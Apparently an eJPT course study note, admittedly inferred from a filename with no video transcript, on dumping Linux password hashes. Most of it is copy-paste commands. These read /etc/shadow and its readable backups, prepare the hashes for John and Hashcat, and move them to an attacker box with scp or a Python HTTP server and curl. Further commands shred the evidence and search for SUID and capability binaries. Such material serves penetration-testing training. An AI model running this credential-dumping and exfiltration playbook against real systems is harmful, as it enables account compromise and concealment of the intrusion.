# 01 - Dumping Linux Password Hashes

Note: No transcript was provided. The following summary is inferred conservatively from the filename and folder (04-LinuxCredentialDumping) and reflects standard eJPT-relevant techniques for dumping Linux password hashes for offline cracking.

## What the video covers (Introduction / big picture)
- Where Linux stores account information (/etc/passwd) and password hashes (/etc/shadow).
- What privileges are needed to access /etc/shadow (root, sudo, or misconfigurations).
- Common places where shadow backups exist and may be readable.
- Safe, minimal steps to extract hashes and prepare them for cracking tools (John the Ripper, Hashcat).
- Quick identification of hash types (e.g., $6$ = SHA-512 crypt, $5$ = SHA-256 crypt, $1$ = MD5 crypt).

## Flow (ordered)
1. Confirm your current privileges (whoami, id, sudo -l).
2. Read /etc/passwd (world-readable) to map users to shells/UIDs.
3. Attempt to read /etc/shadow directly (root/sudo/misconfig).
4. If direct read fails, look for readable backups or misconfigs (/etc/shadow-, /var/backups/shadow.bak).
5. Optionally use getent shadow (requires root) to dump via NSS.
6. Prepare data for cracking:
   - For John: unshadow /etc/passwd and /etc/shadow into a combined file.
   - For Hashcat: extract username:hash pairs (or just hash field with --username).
7. Exfiltrate hashes safely for offline cracking.
8. Clean up artifacts on target if necessary.

## Tools highlighted
- Core utilities: cat, id, whoami, groups, sudo, ls, find, awk, cut, tee
- System databases: getent (passwd, shadow)
- Password prep: unshadow (part of John the Ripper)
- Transfer: scp, base64 + netcat/curl (alternatives if scp unavailable)
- Optional enumeration helpers: getcap (capabilities), stat (permissions)

## Typical command walkthrough (detailed, copy-paste friendly)

Identify yourself and basic context:
```bash
whoami
id
hostname -f 2>/dev/null || hostname
groups
sudo -l 2>/dev/null
```

Dump /etc/passwd (always readable):
```bash
cat /etc/passwd | tee /tmp/passwd
```

Try to read /etc/shadow directly:
```bash
# If you have sudo and your user password:
sudo cat /etc/shadow | tee /tmp/shadow

# If already root:
cat /etc/shadow | tee /tmp/shadow
```

If the direct read fails, hunt for readable backups/misconfigs:
```bash
# Quick known locations
ls -l /etc/shadow /etc/shadow- /var/backups/shadow* 2>/dev/null

# Find any shadow-like file that is world/group-readable
find / -maxdepth 3 -type f \( -name "shadow" -o -name "shadow-*" -o -name "shadow.*" \) -readable -exec ls -l {} \; 2>/dev/null

# If you find a readable candidate, save it
cat /etc/shadow- 2>/dev/null | tee /tmp/shadow
cat /var/backups/shadow.bak 2>/dev/null | tee /tmp/shadow
```

Alternate dump via NSS (requires root):
```bash
getent passwd | tee /tmp/passwd
getent shadow | tee /tmp/shadow
```

Quickly confirm hash types in shadow (look for $id$):
```bash
# Prints username + hash prefix ($1$, $5$, $6$)
awk -F: '($2 ~ /^\$/){split($2,a,"$"); print $1": $"a[2]"$"}' /tmp/shadow
# Common: $6$ = sha512crypt, $5$ = sha256crypt, $1$ = md5crypt
```

Prepare for John the Ripper (preferred for /etc/shadow):
```bash
# Combine passwd + shadow to John format
unshadow /tmp/passwd /tmp/shadow > /tmp/john_hashes.txt
```

Prepare for Hashcat (username:hash pairs or just the hash with --username):
```bash
# Extract "username:hash" pairs (fields 1 and 2)
cut -d: -f1,2 /tmp/shadow > /tmp/hashcat_shadow.txt

# Or, if you only want the hash field (and plan to use --username with the original file):
# cut -d: -f2 /tmp/shadow > /tmp/just_hashes.txt
```

Exfiltrate for offline cracking:
```bash
# Using scp (from your attack box; adjust user/host/path)
scp user@victim:/tmp/john_hashes.txt .
scp user@victim:/tmp/hashcat_shadow.txt .

# If scp not available, lightweight http server from victim:
# On victim:
python3 -m http.server 8080 --directory /tmp
# On attacker:
curl -O http://victim:8080/john_hashes.txt
curl -O http://victim:8080/hashcat_shadow.txt
```

Quick cleanup (optional, on the victim):
```bash
shred -u /tmp/passwd /tmp/shadow /tmp/john_hashes.txt /tmp/hashcat_shadow.txt 2>/dev/null || rm -f /tmp/passwd /tmp/shadow /tmp/john_hashes.txt /tmp/hashcat_shadow.txt
```

Capability and SUID checks (optional, if you cannot read shadow directly):
```bash
# Look for binaries with cap_dac_read_search (can read any file if present)
getcap -r / 2>/dev/null | grep cap_dac_read_search

# Look for interesting SUID binaries that could help escalate to read shadow (use GTFOBins techniques responsibly)
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

## Practical tips
- Reading /etc/passwd is harmless; /etc/shadow requires root, sudo, or a misconfiguration. Avoid modifying system files.
- Check for backups: /etc/shadow-, /var/backups/shadow.bak are common; sometimes admins leave world-readable copies by mistake.
- In /etc/shadow:
  - $6$ indicates SHA-512 crypt (hashcat mode 1800).
  - $5$ indicates SHA-256 crypt (hashcat mode 7400).
  - $1$ indicates MD5 crypt (hashcat mode 500).
  - An entry starting with ! or * means the account is locked or has no login password.
- Prefer unshadow for John; it automatically pairs GECOS and other metadata from /etc/passwd.
- For Hashcat, use --username if you include the username field (username:hash). Otherwise supply just the hash field.
- Always exfiltrate and crack offline; do not attempt to brute-force on the target.
- Log what you took and from where to aid reporting and cleanup.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Baseline
whoami; id; sudo -l 2>/dev/null

# 2) Grab passwd
cat /etc/passwd | tee /tmp/passwd

# 3) Try shadow
sudo cat /etc/shadow | tee /tmp/shadow || cat /etc/shadow 2>/dev/null | tee /tmp/shadow

# 4) If not, check backups
ls -l /etc/shadow* /var/backups/shadow* 2>/dev/null
cat /etc/shadow- 2>/dev/null | tee /tmp/shadow
cat /var/backups/shadow.bak 2>/dev/null | tee /tmp/shadow

# 5) Prep for cracking
unshadow /tmp/passwd /tmp/shadow > /tmp/john_hashes.txt
cut -d: -f1,2 /tmp/shadow > /tmp/hashcat_shadow.txt

# 6) Exfil
# From attacker:
# scp user@victim:/tmp/john_hashes.txt .
# scp user@victim:/tmp/hashcat_shadow.txt .
```

## Summary
- Linux stores account metadata in /etc/passwd and password hashes in /etc/shadow. Reading /etc/shadow requires root/sudo or exploiting misconfigurations/backups.
- Practical dumping steps: enumerate privileges, read /etc/passwd, attempt /etc/shadow, fall back to common backups, and prepare outputs for John (unshadow) or Hashcat (username:hash or hash-only).
- Recognize hash prefixes ($6$, $5$, $1$) to choose cracking modes later.
- Exfiltrate and crack offline; keep operations minimal and clean up artifacts where appropriate.